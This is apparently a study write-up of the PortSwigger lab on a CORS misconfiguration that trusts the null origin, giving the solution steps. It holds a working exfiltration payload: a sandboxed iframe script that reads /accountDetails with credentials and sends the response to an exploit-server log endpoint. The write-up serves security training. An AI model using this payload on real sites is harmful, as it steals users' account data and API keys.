# Lab: CORS vulnerability with trusted null origin

**Official PortSwigger URL:** https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack

**Lab idea:** This challenge focuses on a CORS configuration that trusts the special `null` origin. It practices identifying why treating this origin as trusted can grant unintended cross-origin access to sensitive data.

## Vulnerability in brief
Cross-origin resource sharing (CORS) is a browser mechanism that lets a server selectively permit web pages from other origins to read its resources. It relaxes the same-origin policy (SOP), which otherwise restricts cross-origin access to responses. CORS is a security-sensitive trust configuration, not a general defense against cross-site request forgery (CSRF).

## Solution idea
1. Check intercept is off, then use Burp's browser to log in to your account.
2. Review the history and observe that your key is retrieved via an AJAX request to /accountDetails , and the response contains the Access-Control-Allow-Credentials header suggesting that it…
3. Send the request to Burp Repeater, and resubmit it with the added header Origin: null.
4. Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.
5. In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with the URL for your unique lab URL and YOUR-EXPLOIT-SERVER-ID with the exploit server ID…
6. Click "View exploit".
7. Go back to the exploit server and click "Deliver exploit to victim".
8. Click "Access log", retrieve and submit the victim's API key to complete the lab.

## Payloads / key values
- `/accountDetails`
- `Access-Control-Allow-Credentials`
- `Origin: null.`
- `Access-Control-Allow-Origin`
- `YOUR-LAB-ID`
- `YOUR-EXPLOIT-SERVER-ID`
- `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText); }; </script>"></iframe>`

## Official source
- [PortSwigger Academy: Lab: CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
